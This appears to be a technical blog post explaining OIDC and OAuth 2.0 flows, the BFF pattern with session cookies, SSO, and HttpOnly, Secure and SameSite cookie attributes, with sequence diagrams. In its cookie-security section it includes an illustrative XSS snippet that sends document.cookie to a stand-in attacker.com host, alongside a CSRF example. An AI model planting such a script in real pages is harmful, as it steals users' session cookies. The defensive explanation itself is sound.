---
authors:
- copdips
categories:
- auth
- frontend
- web
- api
comments: true
date:
    created: 2025-11-18
    updated: 2025-11-20
---

# OIDC (OpenID Connect)

[OIDC (OpenID Connect)](https://openid.net/connect/) is an **authentication layer** built on top of the OAuth 2.0 protocol (**authorization layer**). It allows Web-based, mobile, and JavaScript clients to verify the identity of end-users based on the authentication performed by an authorization server (aka AS or IdP), as well as to obtain basic profile information about the end-user in an interoperable and REST-like manner. It eliminates storing and managing people's passwords.

<!-- more -->

## References

1. https://curity.io/resources/learn/spa-best-practices/
2. https://curity.io/resources/learn/oauth-cookie-best-practices/
3. https://auth0.com/blog/application-session-management-best-practices/
4. https://fusionauth.io/articles/login-authentication-workflows/spa/oauth-authorization-code-grant-sessions-refresh-tokens-cookies
5. https://fusionauth.io/articles/authentication/how-sso-works

## OIDC Flows

Some flows (e.g. Implicit Flow, Password Grant (ROPC), without PKCE) have already been deprecated, below are the recommended flows in 2025:

| Flow                                                  | Purpose                  | Notes                           |
| ----------------------------------------------------- | ------------------------ | ------------------------------- |
| Authorization Code Flow (Confidential Client)  | Web backends / BFF       | Uses client_secret              |
| Authorization Code Flow + PKCE (Public Client) | SPA, native apps, desktop, mobile | No client_secret, uses PKCE     |
| Client Credentials Flow                        | Machine-to-machine       | No user involved                |
| Device Authorization Flow (Device Code)        | TVs, CLI apps, IoT       | User logs in on separate device.<br/>Useful when no browser available or with limited input capabilities.<br/>e.g. <https://microsoft.com/devicelogin> |

### Authorization Code Flow + PKCE (Public Client) for SPA

This flow works for a **single audience** (the Downstream API). In some cases, the SPA itself may act as the resource server (e.g., when using FastAPI's auto-generated OpenAPI UI), meaning the audience would be the API backend itself rather than a separate downstream service.

With **PKCE** (Proof Key for Code Exchange), **Authorization Code Injection attacks** are mitigated: even if an attacker steals a valid authorization code, only the original instance that generated the `code_verifier` (the SPA or BFF) can redeem it for tokens, keeping the overall design significantly more robust. And the SPA can securely perform the Authorization Code Flow without a client secret, which is not suitable for public clients like SPAs.

!!! warning "SPA Auth Code flow + PKCE is secure ONLY IF your browser and underlying OS are secure"
    Although with PKCE, the SPA (considered as public client) doesn't need to hold the **client secret**, the main risk factor in SPA+PKCE is XSS attacks, as **access tokens are stored in browser memory/sessionStorage**, which are accessible to JavaScript code running in the browser, including potentially malicious scripts injected via XSS vulnerabilities or browser extensions. Therefore, it's crucial to implement robust security measures to protect against XSS attacks when using this flow.

**OIDC Authorization Code Flow with PKCE for SPA:**


### OIDC Authorization Code Flow (Confidential Client) with BFF pattern and Session Cookies

In **BFF (Backend For Frontend)** pattern , **OIDC** is used for initial authentication and obtaining user identity, then **session cookies** are used to maintain the authenticated state within the application.

BFF often employs this combination. This is widely considered the most secure and robust pattern for modern web applications. BFF handles the complex OIDC token flows and securely translates them into a simple, traditional session cookie for the browser. This approach offers several advantages:

- **performance**: avoid sending large 2-4KB JWT on every request, but with ~100 byte cookie.
- **simplicity**: frontend just needs to include a cookie with its requests, just like in the old days, and doesn't need to manage token refreshing or storage.

!!! note "BFF is considered as a more secure approach compared to SPA+PKCE"
    As tokens are never exposed to the browser environment, reducing the risk of token theft via XSS attacks.
    But BFF itself must implement all the measures to prevent Cross-Site Request Forgery (CSRF) attacks.
    And the SPA must be hosted by the BFF backend due to SameSite cookie for CSRF, which is implemented as a regular web application.

Once the user is authenticated, the BFF can use multiple methods to obtain access tokens for different downstream APIs:

| Method                             | Used For                                          | User Context Provided Directly?              | Multi-API   | Refresh Token Needed |
| ---------------------------------- | ------------------------------------------------- | -------------------------------------------- | ----------- | -------------------- |
| **Refresh Token**                  | Standard BFF                                      | ✔ Yes (from IdP, with BFF's access token)    | ✔ Excellent | ✔ Yes                |
| **Token Exchange (RFC 8693)**      | Best modern multi-API                             | ✔ Yes (delegated, act on behalf of the user) | ✔✔✔ Best    | ❌ No                 |
| **Client Credentials**             | Machine-to-Machine                                | ❌ No                                         | ✔ OK        | ❌ No                 |
| **JWT Bearer Assertion**           | Server identity                                   | Optional (if user included)                  | ✔ Yes       | ❌ No                 |
| **mTLS (with X.509 certificates)** | High security internal systems                    | ❌ No                                         | ✔ Yes       | ❌ No                 |
| **API Keys**                       | Same as mTLS but with API key<br/>Legacy / simple | ❌ No                                         | ✔ OK        | ❌ No                 |
| **Internal Headers / Cookies**     | Service mesh                                      | Optional (propagated)                        | ✔ Yes       | ❌ No                 |

Below is an example sequence diagram illustrating the OIDC Authorization Code Flow with BFF pattern and session cookies, including the use of refresh tokens to obtain access tokens for multiple downstream APIs.

**OIDC Authorization Code Flow with stateful BFF pattern and refresh token grant for multiple Downstream APIs (API-1 and API-2):**

!!! note "the BFF flow could have many variations, below diagram is one of them"

```mermaid
sequenceDiagram
    autonumber

    actor User as User
    participant WebApp as Web Client (SPA/Swagger)
    participant Browser as Browser

    participant BFF as API Backend (Stateful BFF)<br/>(Confidential Client)
    participant BFFStore as BFF Session Store<br/>(Redis/Cache)

    participant IdP as Identity Provider<br/>(OIDC Server)
    participant API1 as Downstream API-1<br/>(Resource Server)
    participant API2 as Downstream API-2<br/>(Resource Server)

    %% ============================================================
    %% STEP 0 — LOGIN INITIATION
    %% ============================================================
    Note over User,IdP: First login
    User ->> WebApp: Click "Login"
    WebApp ->> BFF: GET /login

    %% ============================================================
    %% STEP 1 — BFF GENERATES STATE & PKCE
    %% ============================================================
    Note over BFF: Generate state, nonce, code_verifier<br/>1.**state** (one-time) for CSRF protection for OIDC/OAuth2, computed by client, and returned by IdP in url query param<br/>2. **nonce** (one-time) for ID token replay protection only for OIDC. computed by client, and returned by IdP in ID token claim<br/>3. **code_verifier** (BFF lifetime) for PKCE for code injection prevention. code_challenge=BASE64URL(SHA256(code_verifier))

    BFF ->> BFFStore: Save pre_session {state, nonce, verifier}

    %% FRONT-CHANNEL REDIRECT: Request ALL potential scopes
    BFF ->> Browser: 302 Location: https://idp/authorize?<br/>client_id=my_bff&response_type=code<br/>&scope=openid profile offline_access https://api-1/write https://api-2/read<br/>&state=S555&nonce=N777<br/>&code_challenge=PKCE_HASH&code_challenge_method=S256

    Note right of Browser: [Vendor Specific] Requesting all possible downstream API scopes upfront.<br/>Refresh Token enables Access Token minting for all authorized resources.

    rect rgb(255,245,255)
    Note over Browser: ⚠️FRONT CHANNEL: Query parameters visible to user agent<br/>code_challenge is sent, but it's the asymetric sha265 of code_verifier.<br/>✅But code_verifier is not sent in insecure /authorize browser call.<br/>code_verifier will be sent by BFF in secure /token out of browser.
    end

    Browser ->> IdP: GET /authorize (client_id, state, nonce, scope, code_challenge...)

    %% ============================================================
    %% STEP 2 & 3 — AUTHENTICATION & CODE RETURN
    %% ============================================================
    User ->> IdP: Enter Credentials (Consent)

    IdP ->> Browser: Set-Cookie: idp_session=IDPSESS_ABC
    Note over IdP: 💡 **Session Note:** Flow relies on the BFF Session<br/>the IdP Session Cookie is ignored.

    IdP ->> Browser: 302 https://api/callback?code=C444&state=S555
    Browser ->> BFF: GET /callback?code=C444&state=S555

    %% ============================================================
    %% STEP 4 & 5 — CODE EXCHANGE (BACK-CHANNEL with Full Payload)
    %% ============================================================
    BFFStore ->> BFF: Laod State, Nounce, PKCE code_verifier
    BFF ->> BFF: Validate State

    BFF ->> IdP: 🛑 **Confidential Client Authentication** required<br/>POST /token (Code Exchange)<br/>{grant_type=authorization_code,<br/>code=C444,<br/>client_id=my_bff,<br/>client_secret=SECRET,<br/>code_verifier=VERIFIER}
    Note over BFF,IdP: client_secret and code_verifier are securely sent to IdP out of browser
    IdP ->> IdP: Validate PKCE: BASE64URL(SHA256(code_verifier)) == stored code_challenge ?
    IdP ->> BFF: {<br/>"token_type": "Bearer",<br/>"access_token": "AT_INIT",<br/>"refresh_token": "RT777",<br/>"id_token": "JWT..."<br/>}

    %% ============================================================
    %% STEP 6 — VALIDATION & SESSION CREATION
    %% ============================================================
    BFF ->> BFF: Verify ID Token signature, claims, and ASSERT nonce == N777 ?

    Note over BFF: Create Server-Side Session S333<br/>Store { user_id, refresh_token: RT777 }
    BFF ->> BFFStore: 🔒 **Stateful BFF (most secure)**<br/>Save Session S333 with access_token and refresh_token

    Note over BFF: 💡If use Stateless BFF (less secure), access_token and refresh_token both will be sent to browser<br/>💡If use hybrid BFF (best trade-off), only access_token is sent to browser, refresh_token is kept in the BFF Redis

    BFF ->> Browser: Set-Cookie: session_id=S333<br/>Domain=api.com HttpOnly Secure SameSite=Lax
    Note over Browser: 🔒 **Stateful BFF (most secure)**<br/>Browser **NEVER** sees tokens, but just a session id

    Browser ->> WebApp: Redirect to Dashboard

    %% ============================================================
    %% OPERATIONAL PHASE — CALLING API-1 (Refresh Grant with Full Payload)
    %% ============================================================
    Note over User,API1: Post-login: Call API-1
    Browser ->> BFF: GET /api1/data (Cookie S333)
    BFF ->> BFFStore: Load Session S333

    alt Access Token for API-1 Missing or Expired
        Note over BFF: Minting access_token using refresh_token<br/>(Confidential Client Authentication)<br/><br/>1. BFF checks: Do I have a valid refresh_token?<br/>   → Yes: Use refresh_token to get new access_token (silent)<br/>   → No: Redirect to IdP /authorize<br/><br/>2. Browser redirects to /authorize<br/>   Automatically sends idp_session cookie (from previous login)<br/><br/>3. IdP validates session cookie<br/>   → Valid: Return auth code immediately (SSO, no login UI)<br/>   → Invalid: Show interactive login page<br/><br/>4. BFF exchanges auth code for tokens<br/>   Uses client_secret (confidential client)<br/><br/>🚀In this flow, BFF has a valid refresh_token, allowing it to silently obtain new access tokens without user interaction

        BFF ->> IdP: POST /token (Refresh Grant)<br/>{grant_type=refresh_token,<br/>refresh_token=RT777,<br/>client_id=my_bff,<br/>client_secret=SECRET,<br/>resource=https://api-1}

        IdP ->> BFF: { "access_token": "AT_API1", "refresh_token": "RT888" (optional rotation) }
        BFF ->> BFFStore: Update Session (Save AT_API1, Store RT888 if rotated)
    end

    BFF ->> API1: GET /resource<br/>Authorization: Bearer AT_API1
    API1 -->> BFF: Data
    BFF -->> Browser: Data

    %% ============================================================
    %% OPERATIONAL PHASE — CALLING API-2 (Reusing RT for New Resource)
    %% ============================================================
    Note over User,API2: Post-login: Call API-2

    Browser ->> BFF: GET /api2/data (Cookie S333)
    BFF ->> BFFStore: Load Session S333

    alt Access Token for API-2 Missing or Expired
        Note over BFF: Reuse RT to get token for new resource (API-2)

        BFF ->> IdP: POST /token (Refresh Grant)<br/>{grant_type=refresh_token,<br/>refresh_token=RT888,<br/>client_id=my_bff,<br/>client_secret=SECRET,<br/>resource=https://api-2}

        IdP ->> BFF: { "access_token": "AT_API2", "refresh_token": "RT999" (optional rotation) }
        Note over BFF: Store AT_API2 in Session
    end

    BFF ->> API2: GET /resource<br/>Authorization: Bearer AT_API2
    API2 -->> BFF: Data
    BFF -->> Browser: Data
```



## FAQ

### OIDC vs OpenID vs OpenID 2.0

- **OpenID and OpenID 2.0** (based on XML) are both deprecated.

- **OIDC (OpenID Connect)** is the modern standard driven by the same foundation, which is based on OAuth2 with JWT.

### OIDC vs OAuth2

**In short**: **OIDC** adds authentication (verifying user identity) on top of **OAuth 2.0** as for authorization framework (verifying user access).

| Aspect | OAuth 2.0 | OIDC |
|--------|-----------|------|
| **Primary purpose** | Authorization (what can you access?) | Authentication (who are you?) |
| **Token type** | `access_token` only | `access_token` + `id_token` |
| **User identity** | Not standardized (indirect via `/userinfo` API call) | Standardized via `id_token` (JWT with claims) |
| **Use case** | API access delegation | User login + SSO |

!!! note "Indirect authentication with pure OAuth 2.0"
    It's worth noting that even with pure OAuth 2.0, applications can achieve a form of authentication indirectly: the `access_token` can be used to call an API endpoint (such as `/userinfo`, for e.g. <https://graph.microsoft.com/oidc/userinfo>) on the resource server to retrieve basic user profile information. By obtaining this data, the application can identify the user, match them against its own user database, and establish a local session. But this approach is not standardized and relies on application-specific implementation, which is precisely the gap that OIDC fills with its formal authentication layer.

!!! warning "`id_token` is used by the client application to authenticate the user, not to access resource servers"
    The `id_token` is intended for the client application (e.g. BFF backend, or the mobile app, or SPA) to verify the user's identity, display the user profile, ensure SSO, and establish a session, etc. It should not be used as a bearer token to access protected resources or APIs. Instead, the `access_token` (with permissions scope) should be used for that purpose.

### access_token vs id_token

| Aspect | access_token | id_token |
|--------|--------------|----------|
| **Purpose** | Used to access protected resources (APIs) | Used to authenticate the user to the client application.<br/><br/>Never sent to downstream APIs (resource servers).<br/><br/>Machine-to-Machine Client Credentials flow doesn't have id_token.<br/><br/>OAuth2.0 doesn't define id_token. OIDC (on top of OAuth2.0) does.<br/><br/>OIDC never uses machine-to-machine flow |
| **Audience** | Intended for resource servers (APIs)<br/><br/>or BFF, SPA if itself is a resource server too | Intended for the client application (e.g., BFF backend, mobile app, SPA) |
| **Content** | Contains scopes and permissions.<br/><br/>But could contains some common user claims too depends on IdP.<br/><br/>Could get full user profile by calling IdP /userinfo endpoint with access_token | Contains user identity claims (e.g., sub, name, email) |
| **Format** | Often a JWT, but can be legacy opaque<br/><br/>use opaque token to call /introspect or /userinfo| Always a signed JWT (JWS) or encrypted (JWE) |
| **Validation** | Validated by resource servers | Validated by the client application |

### OIDC vs SAML

- **SAML** (Security Assertion Markup Language) is an older standard in **XML** for single sign-on (SSO) and identity federation, primarily used in enterprise environments, and **only for web-based applications**.

- **OIDC** is a more modern protocol in **JSON/REST** that is easier to implement and is designed for **web and mobile applications**, could be used for SSO too.

### OIDC vs Cookies

Session cookies are simpler for single-application scenarios, while OIDC is better suited for distributed systems, microservices, and multi-application environments where centralized authentication and SSO are needed.

- **Cookies**

    Are a traditional authentication mechanism where the server creates a session after successful login and sends a session ID to the client as a cookie. The client includes this cookie in subsequent requests to maintain the authenticated state. This approach is **tightly coupled** to the server that created the **stateful** session and requires **server-side session storage**.

- **OIDC**:

    Is a **stateless, distributed-friendly authentication protocol** that uses tokens (ID **token**, access token) instead of server-side sessions. Tokens are **self-contained** (especially JWTs), can be **verified independently** without server state, and enable **single sign-on (SSO)** across multiple applications. OIDC separates the authentication provider (IdP) from the application, allowing **centralized identity management**.

- **Session cookies + OIDC**

    Also known as **BFF (Backend For Frontend)** (check [OIDC Authorization Code Flow (Confidential Client) with BFF pattern and Session Cookies](#oidc-authorization-code-flow-confidential-client-with-bff-pattern-and-session-cookies) for more info), is a common pattern: OIDC is used for initial authentication and obtaining user identity, then session cookies are used to maintain the authenticated state within the application for **performance** (avoid sending large 2-4KB JWT on every request, but with ~100 byte cookie) and **simplicity** (frontend just needs to include a cookie with its requests, just like in the old days, and doesn't need to manage token refreshing or storage).

    BFF (Backend For Frontend) pattern often employs this combination. This is widely considered the most secure and robust pattern for modern web applications. BFF handles the complex OIDC token flows and securely translates them into a simple, traditional session cookie for the browser.

    **Session cookie + OIDC hybrid (BFF pattern) with FastAPI and Azure Entra auth flow:**

    ```mermaid
    sequenceDiagram
        participant Browser
        participant BFF as BFF (FastAPI)
        participant IdP as Azure Entra
        participant API as Downstream API

        Note over Browser,API: Initial Authentication
        Browser->>BFF: GET /login
        BFF->>Browser: Redirect to Azure Entra
        Browser->>IdP: Authorization request
        IdP->>Browser: Login page
        Browser->>IdP: Credentials
        IdP->>Browser: Redirect with auth code
        Browser->>BFF: GET /callback?code=xxx
        BFF->>IdP: Exchange code for tokens
        IdP->>BFF: id_token + access_token (JWT ~3KB)
        BFF->>BFF: Create session, store tokens
        BFF->>Browser: Set-Cookie: session_id=abc (~100B)

        Note over Browser,API: Subsequent Requests (Performance Win)
        Browser->>BFF: GET /api/data<br/>Cookie: session_id=abc (~100B)
        BFF->>BFF: Validate session
        BFF->>API: GET /resource<br/>Authorization: Bearer JWT (~3KB)
        API->>BFF: Response data
        BFF->>Browser: Response data

        Note over Browser,BFF: Multiple frontend requests = tiny cookies
        Note over BFF,API: Selective backend calls = JWTs only when needed
    ```

#### Cookie is still very important in modern web auth

Even with the rise of token-based authentication mechanisms like OIDC and JWT, cookies remain a fundamental component of web authentication. They provide a convenient way to maintain session state, especially in traditional web applications and BFF architectures. Properly secured cookies (using HttpOnly, Secure, SameSite attributes) can effectively mitigate risks such as XSS and CSRF attacks.

When people say *"Cookies are legacy."* they usually mean *"Server-side sessions are legacy."*.

| Aspect               | ❌The 'Legacy' Part (Being Phased Out)                  | ❌The 'Insecure' Trend (Local Storage)                          | ✅The 'Modern' Part (First-Party HttpOnly Cookies)                                                                      |
| -------------------- | ----------------------------------------------------- | ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| **Primary Use Case** | Cross-site tracking, ads, retargeting                 | SPA Authentication (JWTs), UI preferences                     | User session management, authentication                                                                               |
| **Storage Type**     | Third-party cookies<br/><br/>You visit `Shoes.com`, but `Facebook.com` leaves a cookie on your browser to see that you like shoes.                                   | Browser Local Storage (Not a cookie)<br/><br/>Get a token, put it in localStorage,<br/>send it in the Header.                          | First-party cookies, stored in browser's cookie store (in memory if session only, or on disk if persistent cookie)                                                                                                 |
| **Current Status**   | Blocked by default in Safari/Firefox; dying in Chrome | Discouraged for Auth; vulnerable to XSS (Hackers can read it) | Standard & Secure (when using HttpOnly flag)<br/>👍Privacy: stay on one site<br/>👍Security: browser hides the keys |
| **Key Trend**        | Replacement by Privacy Sandbox / First-party data     | Moving back to Cookies (BFF Pattern) to hide tokens from JS   | Strengthened security via attributes (HttpOnly, Secure, SameSite)

!!! Tip "Token-Mediating Backend pattern"
    While a BFF can act as an API proxy and session manager, it may become a throughput bottleneck. The [Token-Mediating Backend pattern](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps#name-token-mediating-backend) addresses this by letting the client browser call downstream APIs directly with short-lived access tokens minted by BFF. This shifts access tokens into the client, so the security posture is weaker unless hardened with mechanisms such as [DPoP (Demonstrating Proof of Possession)](https://auth0.com/blog/oauth2-security-enhancements/#Demonstrating-Proof-of-Possession--DPoP).

    "The more moving parts in auth, the harder it is to attack. 😂"

!!! note "The 'Pendulum Swing': Cookies -> localStorage -> HttpOnly Cookies"

    In web development, the pendulum is swinging back.

    - **2000s**: Everyone used Cookies (Secure).

    - **2010s**: Everyone switched to Local Storage + JWTs because it was easier for SPAs, purely stateless JWT token. No cookies, no sessions, no CSRF middleware ("The New Way" - Insecure).

    - **2020s**: We realized Local Storage is dangerous (XSS attacks). Now, the industry is moving back to Cookies ("The Legacy Way"), but using them to hold modern JWTs. And with HttpOnly cookies stored in the browser's cookie store (in memory for session cookies or on disk to browser's SQLite DB for e.g. if persistent cookie with the `Expires` or `Max-Age` attribute), they are not accessible to JavaScript, mitigating XSS risks.

#### Securing Cookies in Modern Authentication

!!! warning "It's secure ONLY IF your browser, underlying OS, device, the network layer, even the target servers are secure"

`HttpOnly`, `Secure`, and `SameSite` cookie attributes is key to modern cookie security. Here's how they work together to mitigate risks:

- `HttpOnly`: This attribute makes a cookie inaccessible to client-side JavaScript (document.cookie API). This is your primary defense against `XSS` (Cross-Site Scripting) attacks, as it prevents malicious scripts from stealing session cookies. **Attacker cannot read the cookie**.

    !!! note "Example: XSS (Cross-Site Scripting) Attack"

        1. Attacker injects malicious script into a vulnerable web page.

            ```html title="Example: XSS Cross-Site Scripting Attack"
            <script>
                fetch('https://attacker.com/steal?cookie=' + document.cookie)
            </script>
            ```

        2. You visit the compromised page.
        3. If cookies are stored in localStorage or non-HttpOnly cookies -> ⚠️stolen⚠️

- `Secure`: This ensures the cookie is only sent over encrypted HTTPS connections. This prevents `man-in-the-middle` attackers from eavesdropping and stealing cookies during transmission. **Attacker cannot read the cookie in transit**.
- `SameSite`: This attribute helps defeat `CSRF` (Cross-Site Request Forgery) attacks by controlling when cookies are sent with cross-site requests. **Attacker cannot use the cookie**.

    - `SameSite=Lax` (Recommended default): Cookies are sent on same-site requests and top-level navigations (e.g., clicking a link from an email to your site). This provides a good balance of security and usability.
    - `SameSite=Strict` (Maximum security): Cookies are only sent in a first-party context.
    - `SameSite=None`: Cookies are sent in all contexts, including third-party. This is sometimes necessary for cross-site features but must be paired with the Secure attribute.

    !!! note "Example: CSRF (Cross-Site Request Forgery) Attack"

        1. You are logged in to bank.com (your browser stores login cookie)
        2. You visit evil.com
        3. evil.com secretly loads:

            ```html
            
            ```

        5. Your browser automatically sends your cookies to bank.com
        6. The bank sees a valid cookie and approves the transfer -> ⚠️Bad⚠️

        So CSRF is an attack FROM ANOTHER SITE, using your browser as a trusted agent.

        **How SameSite prevents CSRF:**

        CSRF requires:

        1. Attacker site → triggering a request to victim site
        2. Browser → auto-attaching cookies

        SameSite blocks the second step.

        Example:

         - Victim site: `https://bank.com`
         - Attacker site: `https://evil.com`

        The browser tries to load:

        ```html
        <form action="https://bank.com/transfer" method="POST">
        ```

        But if cookie is:

        ```ini
        Set-Cookie: session=123; Domain=bank.com; Path=/; SameSite=Lax;
        ```

        Then browser thinks:

        - This request originates from `evil.com`
        - This is a cross-site POST to another site (`bank.com`)

        -> 🎉Do NOT send the session cookie🎉

#### HttpOnly Cookies + BFF Pattern: The Modern Best Practice

A common and secure modern pattern is to ==use an HttpOnly cookie (the container) to transport a JWT token (Stateless BFF) or a session ID (Stateful BFF)==. In this setup, the authentication server issues a token (like a JWT) but instead of sending it to the JavaScript code, it places it inside an HttpOnly cookie. The browser automatically stores the cookie and sends it with every request to your backend, combining the stateless benefits of tokens with the built-in XSS protection of cookies.

| Feature                        | ⚡Stateless BFF                                                   | 🚀Hybrid BFF                                                                                         | 🛡️Stateful BFF                                                                                                    |
| ------------------------------ | --------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| **What is inside the Cookie?** | Both access token and refresh token (HttpOnly)            | Short-lived access token JWT (HttpOnly)                                                            | A random opaque session ID<br/>Or a JWT-like session token issued by BFF (not by IdP)<br>both session id and session token could be saved in local memory or a remote Redis cache for scalability                                                                                               |
| **Where is the JWT?**          | Inside the cookie (browser)                                     | **Stateless** access token in cookie<br/>**Stateful** refresh token + extra context in BFF store                                 | In BFF store (often Redis)                                                                                              |
| **Cookie Size**                | Large with access token<br/>(can hit 4 KB limit)                                      | Large with access token<br/>(But trimmed lifetime/claims)                                                           | Tiny (just an cookie session ID)                                                                                                |
| **Performance**                | Larger cookie + JWT signature verification; no store lookup     | 99% requests are stateless JWT access token checks; occasional store refresh token lookup when minting new access tokens             | Extra Redis/DB lookup each request                                                                               |
| **Complexity**                 | Low (no BFF store required)                                      | High (almost the same as Stateful BFF)                               | High (requires durable session store)                                                                            |
| **Security Verdict**           | ✅ Very good (mitigates XSS/CSRF via HttpOnly/SameSite)<br/>❌long-live refresh token is at client side<br/>❌Cannot revoke tokens immediately         | ✅✅ Balanced: long-live refresh token is at BFF side, fast revocation via store, limited exposure window per short-live access token | ✅✅ Best: full server control over sessions and immediate revocation capability                                   |

!!! note "Stateless and Stateful BFF hybrid mode with short revocation time"
    In practice, many BFF implementations use a hybrid approach in high-throughput systems (1000 requests/hour/user): they store a **short-lived** (15 min for example) JWT `access_token` inside an HttpOnly cookie for **stateless** authentication, while also maintaining a server-side session store for additional user context, **long-lived** (expires in 7 days for example) `refresh_token`, or other **stateful** data. This hybrid model combines the benefits of both approaches, providing robust security and flexibility.

    **The trade-off**: You sacrifice ~1% performance (Redis/DB IO lookup for refresh token, but ~99% requests are with access token which need local CPU compute only for JWT verification) for dramatically better security posture (Delete refresh_token -> no new JWTs issued). It's important to notice that the current JWT access token can still alive for at most 15 min after the refresh_token deletion. In practice, this is imperceptible to users but gives you instant revocation capability.
    This is why it's considered "best", it's the optimal point on the security/performance curve for most applications.

    Hybrid mode is **NOT** useful for light user load (1 requests/hour/user) with short lived access tokens (15 min), use stateful BFF only in that case.

### OIDC vs SSO

**OIDC** answers *"Who is the user"*, **SSO** is a feature (not a protocol) built **on top of OIDC/JSON or SAML/XML or Kerberos**, providing a standardized way to authenticate users across multiple applications with a single login. SSO uses cookies too shown in above [OIDC vs Cookies](#oidc-vs-cookies) part.

```mermaid
sequenceDiagram
    autonumber
    actor User as User (Browser)
    participant App1 as App1 UI
    participant App2 as App2 UI
    participant BFF1 as BFF1 (FastAPI A)
    participant BFF2 as BFF2 (FastAPI B)
    participant BFFStore as BFF Session Store<br/>(shared for BFF1+BFF2)
    participant IdP as Identity Provider (OIDC)
    participant IdPStore as IdP Store

    %% =====================================================================
    %% FIRST LOGIN — APP1
    %% =====================================================================

    User ->> App1: Visit App1 (unauthenticated)
    App1 ->> BFF1: GET /login

    Note over BFF1: Create state=S1<br/>Create nonce=N1<br/>Generate pre_session=P1
    BFF1 ->> BFFStore: Save {state:S1, nonce:N1, pre_session:P1}

    %% FRONT-CHANNEL REDIRECT TO IdP
    BFF1 ->> User: 302 Redirect to IdP /authorize?<br/>client_id=app1<br/>state=S1<br/>nonce=N1

    %% BROWSER SENDS TO IdP
    User ->> IdP: GET /authorize (state=S1, nonce=N1)

    %% NO EXISTING IdP SESSION
    Note over IdP: No idp_session cookie received →<br/>User not logged in at IdP

    User ->> IdP: Enter username/password (interactive login)

    %% IdP CREATES SSO SESSION
    Note over IdP: Create login_session LS123<br/>Bind to user "alice"
    IdP ->> IdPStore: Save LS123

    %% **IdP sets its own SSO cookie in browser**
    IdP ->> User: Set-Cookie: idp_session=IDPSESS_ABC<br>Domain=auth.idp.com<br/>HttpOnly<br/>Secure<br/>SameSite=Lax

    %% THEN REDIRECT BACK TO APP1
    IdP ->> User: 302 https://app1/callback?<br/>code=C111&state=S1

    %% BROWSER RETURNS TO APP1 BACKEND
    User ->> BFF1: GET /callback?code=C111&state=S1

    %% BACKEND VALIDATES STATE
    BFF1 ->> BFFStore: Load stored state for P1
    BFF1 ->> BFF1: Validate: callback.state == stored.state ?

    %% TOKEN EXCHANGE
    BFF1 ->> IdP: POST /token (code=C111)
    IdP ->> BFF1: id_token + access_token + refresh_token

    %% NONCE VALIDATION
    BFF1 ->> BFFStore: Load stored nonce for P1
    BFF1 ->> BFF1: Validate: id_token.nonce == stored nonce ?

    %% CREATE LOCAL APP SESSION
    Note over BFF1: Create local session SESS1<br/>with user + tokens
    BFF1 ->> BFFStore: Save session SESS1 → { user:alice, tokens }

    %% APP1 SESSION COOKIE
    BFF1 ->> User: (Stateful BFF) Set-Cookie: session_id=SESS1<br>Domain=bff.company.com<br/>HttpOnly<br/>Secure<br/>SameSite=Lax

    User ->> App1: Authenticated (Authorized 🔓)


    %% =====================================================================
    %% SECOND LOGIN — APP2 (SSO)
    %% =====================================================================

    Note over User,IdpStore: SECOND LOGIN to APP2 with SSO

    User ->> App2: Visit App2
    App2 ->> BFF2: GET /login
    alt Browser already has session_id=SESS2 cookie
        BFF2 ->> BFFStore: Lookup SESS2
        alt Valid session found
            Note over BFF2: User already logged into App2<br/>Skip IdP, skip SSO
            BFF2 ->> User: 302 Redirect to App2 home (Authorized)
        else Invalid/expired SESS2
            Note over BFF2: Session invalid → perform fresh OIDC login
        end
    else No session_id cookie
        Note over BFF2: No App2 session → must start OIDC flow
    end

    %% Only reaches here if LOCAL session doesn't exist

    Note over BFF2: Create state S2<br/>Create nonce N2
    BFF2 ->> BFFStore: Save {state:S2, nonce:N2, pre_session:P2}

    BFF2 ->> User: 302 Redirect to IdP /authorize?<br/>client_id=app2<br/>state=S2<br/>nonce=N2

    User ->> IdP: GET /authorize?<br/>client_id=app2<br/>&redirect_uri=https://app2/callback<br/>&response_type=code<br/>&scope=openid%20profile%20offline_access<br/>&state=S2<br/>&nonce=N2<br/><br/>Headers<br/>Cookie: idp_session=IDPSESS_ABC
    Note over User: ❗Send IdP cookie for App2 as SSO login.<br/>No cookie to App1 for first login.

    Note over IdP:  IdP session exists → SKIP login UI<br/>✅ No interactive user login any more (SSO silent login)
    IdP ->> User: 302 https://app2/callback?code=C222&state=S2

    User ->> BFF2: GET /callback?code=C222&state=S2

    %% STATE VALIDATION (APP2)
    BFF2 ->> BFFStore: Load state S2
    BFF2 ->> BFF2: Validate: callback.state == stored.state ?
    Note over BFF2: State validation OK

    %% TOKEN EXCHANGE
    BFF2 ->> IdP: POST /token (code=C222)
    IdP ->> BFF2: id_token + access_token + refresh_token

    %% NONCE VALIDATION (APP2)
    BFF2 ->> BFFStore: Load nonce N2
    BFF2 ->> BFF2: Validate: id_token.nonce == stored_nonce ?
    Note over BFF2: Nonce validation OK

    %% CREATE SESSION FOR APP2
    Note over BFF2: Create local app session SESS2
    BFF2 ->> BFFStore: Save session SESS2 → { user:alice, tokens }

    BFF2 ->> User: Set-Cookie session_id=SESS2

    User ->> App2: Authenticated instantly (SSO)


    %% =====================================================================
    %% RESULT — TWO APP SESSIONS, ONE IdP SESSION
    %% =====================================================================

    Note over User,App1: User has session_id=SESS1 for App1
    Note over User,App2: User has session_id=SESS2 for App2

    Note over IdP: One IdP SSO session:<br/>idp_session=IDPSESS_ABC<br/>powers login-free access for all apps
```


